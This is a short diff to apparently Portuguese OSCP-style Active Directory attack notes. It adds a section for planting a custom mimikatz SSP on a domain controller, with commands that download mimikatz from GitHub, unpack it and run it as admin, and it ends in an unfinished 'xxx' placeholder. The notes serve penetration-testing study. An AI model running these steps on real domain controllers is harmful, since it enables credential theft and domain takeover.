@@ -1546,8 +1546,15 @@ TESTAR A CONEXÃO NO NOVA JANELA:
 dir \\tech-dc01\c$
 ```
 
-
-
+### CUSTOM SSP MIMIKATZ - EXECUTAR PATCH NO DC(COMO ADMIN):
+##### CUSTOM SSP MIMIKATZ - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
+expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
+cd x64
+.\mimikatz.exe
+```
+xxx
 
 
 
